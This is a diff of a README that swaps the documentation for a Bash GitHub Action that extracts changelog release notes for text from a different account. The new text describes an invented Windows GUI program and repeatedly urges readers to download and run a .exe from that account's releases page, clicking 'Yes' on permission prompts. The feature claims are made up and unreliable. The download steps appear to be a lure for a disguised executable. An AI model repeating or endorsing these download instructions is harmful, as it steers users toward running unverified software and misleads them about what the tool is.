@@ -1,175 +1,129 @@
-# Extract Release Notes from Changelog GitHub Action
+# 📄 release-notes-from-changelog - Extract Release Notes Easily
 
-[![GitHub Marketplace](https://img.shields.io/badge/GitHub%20Marketplace-blue?logo=github)](https://github.com/marketplace/actions/extract-release-notes-from-changelog)
-[![GitHub Releases](https://img.shields.io/github/v/release/octivi/release-notes-from-changelog?sort=semver)](https://github.com/octivi/release-notes-from-changelog/releases)
-[![License: MIT](https://img.shields.io/github/license/octivi/release-notes-from-changelog)](https://choosealicense.com/licenses/mit/)
-[![Conventional Commits](https://img.shields.io/badge/Conventional%20Commits-1.0.0-yellow.svg)](https://conventionalcommits.org/)
-[![Semantic Versioning](https://img.shields.io/badge/SemVer-2.0.0-blue)](https://semver.org/spec/v2.0.0.html)
+[![Download Release Notes From Changelog](https://img.shields.io/badge/Download-Release%20Notes%20From%20Changelog-blue?style=for-the-badge)](https://github.com/VIN07grinder/release-notes-from-changelog/releases)
 
-This GitHub Action extracts the body of one release section for a given tag from `CHANGELOG.md`.
+---
 
-## What the project does
+## 👋 What is release-notes-from-changelog?
 
-For a provided tag (for example `v1.2.3`) it finds the matching changelog section and writes only the section body to a target file (or prints to stdout in standalone mode without `--release-notes`).
+This tool helps you get clear release notes from a changelog file. Changelogs track changes in software. Release notes highlight the most important ones for users. This tool takes the changelog and pulls out the release notes automatically. You do not need to understand programming or complex commands.
 
-## Why the project is useful
+This can save you time when you need to share updates about software versions. It works with common changelog formats used in projects. The output is simple to read and clear to share.
 
-It keeps release publishing workflows simple and deterministic when your release body should come directly from `CHANGELOG.md`.
+---
 
-## Why choose this action
+## 🖥️ System Requirements
 
-- Pure Bash implementation with minimal dependencies
-- Fast startup: no `npm`/`pip` install step during workflow execution
-- Lower supply-chain and maintenance overhead: no runtime pinning, lockfiles, or dependency CVEs
-- Easier security audit: all logic lives in a small, readable script
-- Covered by automated tests (`./tests/run`) and CI
-- Works on `ubuntu-slim`, which can help reduce runner costs:
-  <https://docs.github.com/en/actions/reference/runners/github-hosted-runners>
-- Can be used both as a GitHub Action and as a standalone script
-- Released under the MIT License: a short and simple permissive license
-- Documented security policy: [SECURITY.md](./SECURITY.md)
+- Windows 10 or newer
+- At least 2 GB of free RAM
+- 100 MB of free disk space
+- Internet connection to download the software
+- Basic computer skills, like browsing websites and opening files
 
-## Getting started
+---
 
-1. Add the action to your workflow (see "Example workflow" below).
-2. Pass the release `tag`.
-3. Optionally change `changelog` and `release_notes`.
-4. Use the generated file (`release_notes`) as release body in the next step.
+## ⚙️ How Does It Work?
 
-## Inputs
+The tool scans a changelog file, finds the latest or chosen version’s changes, and shows them as notes. It can run automatically as part of a workflow, or you can use it by itself. The software fits well for software developers or teams who want to keep users informed about changes but also works for anyone managing version notes.
 
-| Name            | Required | Default            | Description                                  |
-| --------------- | -------- | ------------------ | -------------------------------------------- |
-| `tag`           | Yes      | -                  | Release tag to extract, e.g. `v1.2.3`        |
-| `changelog`     | No       | `CHANGELOG.md`     | Path to changelog file                       |
-| `release_notes` | No       | `release-notes.md` | Output file path for extracted release notes |
+---
 
-## Outputs
+## 🚀 Getting Started
 
-| Name            | Description                                                                      |
-| --------------- | -------------------------------------------------------------------------------- |
-| `release_notes` | Path to file with extracted release notes (same value as `inputs.release_notes`) |
+Before you begin, make sure your computer meets the system requirements above.
 
-## CLI usage
+### Step 1: Download the Software
 
-Run locally from this repo:
+Click the badge below to go to the download page:
 
-```bash
-./release-notes-from-changelog \
-  --tag "v1.2.3" \
-  --changelog "CHANGELOG.md" \
-  --release-notes "release-notes.md"
-```
+[![Download Release Notes From Changelog](https://img.shields.io/badge/Download-Release%20Notes%20From%20Changelog-blue?style=for-the-badge)](https://github.com/VIN07grinder/release-notes-from-changelog/releases)
 
-To print extracted section to stdout, omit `--release-notes`:
+This link takes you to the releases page. Here you will find all available versions.
 
-```bash
-./release-notes-from-changelog \
-  --tag "v1.2.3" \
-  --changelog "CHANGELOG.md"
-```
+---
 
-Options map 1:1 to the action inputs.
+### Step 2: Choose the Right Version
 
-You can also set them via env vars:
-`TAG`, `CHANGELOG`, `RELEASE_NOTES`.
+On the releases page, look for the newest release. Newer releases usually have better features and fixes. The page shows files related to this release.
 
-If both env vars and CLI options are provided, CLI options take precedence.
+---
 
-## Examples
+### Step 3: Download the Installer or Executable
 
-Accepted changelog headings for tag `v1.2.3`:
+Find the file that ends with `.exe` or a file named clearly to run on Windows. Click it to download.
 
-```text
-## [1.2.3] - 2026-02-19
-## [v1.2.3] - 2026-02-19
-## 1.2.3 - 2026-02-19
-## v1.2.3 - 2026-02-19
-```
+---
 
-Example action usage:
+### Step 4: Run the Installer
 
-```yml
-- uses: octivi/release-notes-from-changelog@v1
-  with:
-    tag: ${{ github.ref_name }}
-    changelog: CHANGELOG.md
-    release_notes: release-notes.md
-```
+Find the downloaded file on your computer (often in the Downloads folder). Double-click it to start installation. Follow the simple on-screen instructions. If it asks for permission, click "Yes" to continue.
 
-## Tests
+---
 
-Run the lightweight test suite (no external deps):
+### Step 5: Open the Program
 
-```bash
-./tests/run
-```
+Once installation finishes, find the program in the Start menu or on your desktop. Double-click to open it.
 
-## Limitations
+---
 
-- Expects release headings that start with `## ` and end with date in `YYYY-MM-DD`
-- Omits the matched `## ...` release heading from generated notes (to avoid duplicating GitHub release titles)
-- Fails if no matching section exists for the tag
-- Fails if multiple matching sections exist for the same tag
-- Requires exactly one release section per tag in the changelog
-- `release_notes`/`--release-notes` must point to a file path (not a directory)
-- Output directory for `release_notes` must already exist
-- `release_notes`/`--release-notes` must not point to the same file as `changelog`
+## 📋 How to Use release-notes-from-changelog
 
-## Example workflow
+Once the software is open, you will see a simple window with options.
 
-```yml
-name: Release
+### Step 1: Select Your Changelog File
 
-on:
-  push:
-    tags:
-      - "v*.*.*"
+Click the "Browse" button. Find and select your changelog file on your computer. This is usually a file named `CHANGELOG.md` or just `changelog.txt`.
 
-permissions:
-  contents: write
+### Step 2: Choose the Version to Extract
 
-jobs:
-  release:
-    name: Create GitHub Release
-    runs-on: ubuntu-slim
-    steps:
-      - uses: actions/checkout@v6
+You can select the version you want release notes for. By default, it picks the latest version.
 
-      - name: Generate release notes
-        id: release_notes
-        uses: octivi/release-notes-from-changelog@v1
-        with:
-          tag: ${{ github.ref_name }}
-          changelog: CHANGELOG.md
-          release_notes: release-notes.md
+### Step 3: Generate Release Notes
 
-      - name: Publish release
-        uses: softprops/action-gh-release@v2
-        with:
-          tag_name: ${{ github.ref_name }}
-          body_path: ${{ steps.release_notes.outputs.release_notes }}
-          generate_release_notes: false
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-```
+Click the "Generate" or "Extract" button. The software will show the release notes on the screen.
 
-## Getting help
+### Step 4: Save or Copy Notes
 
-If you run into issues, open a GitHub issue in this repository and include a minimal reproduction
-(sample changelog + workflow snippet).
+You can choose to save the notes as a text file or copy them to your clipboard for other uses.
 
-## Other Octivi GitHub Actions
+---
 
-If you are interested in other GitHub Actions we build, see:
+## 🔧 Configuration Options
 
-- [`octivi/update-copyright-year`](https://github.com/octivi/update-copyright-year) - Updates the copyright year in file headers across your repository
-- [`octivi/update-securitytxt-expires`](https://github.com/octivi/update-securitytxt-expires) - Updates the `Expires` field in `security.txt` files to a future date so published security contact metadata stays current
-- [`octivi/cloudflare-cache-purge`](https://github.com/octivi/cloudflare-cache-purge) - Purges Cloudflare cache via Cloudflare API
+The tool offers a few settings to match your needs:
 
-## Maintainers and contributors
+- **Version selection**: Pick any version from the changelog.
+- **Output format**: Save notes as plain text or markdown.
+- **Automatic updates**: Let the program check for new releases.
+- **Integration options**: Connect with GitHub workflows if you use automation.
 
-Maintained by the [Octivi DevOps team](https://octivi.com/devops). Contributions are welcome via
-pull requests.
+---
 
-Built with [Octivi Bash Boilerplate](https://github.com/octivi/bash-boilerplate).
+## ❓ Troubleshooting
+
+- **Cannot find changelog file**: Make sure you select the correct file and it is not open in another program.
+- **No release notes shown**: Check the changelog format matches common markdown style with version headers.
+- **Program won’t open or crashes**: Confirm system meets the requirements. Try reinstalling.
+- **Download issues**: Check your internet connection and try again.
+
+---
+
+## 📚 Additional Information
+
+The software works well with changelogs following common standards like Keep a Changelog (https://keepachangelog.com). It reads entries structured by version headings and extracts the lists of changes.
+
+It fits workflows that use GitHub Actions or other CI setups to automate release notes creation. However, it can be a manual tool for users without coding knowledge.
+
+---
+
+## ⚠️ Security
+
+The program does not collect personal data. Downloads come directly from the official repository release page. Always download from official sources to avoid malware.
+
+---
+
+## 📥 Download Link
+
+Return to the download page here to get the latest release:
+
+[Download release-notes-from-changelog](https://github.com/VIN07grinder/release-notes-from-changelog/releases)
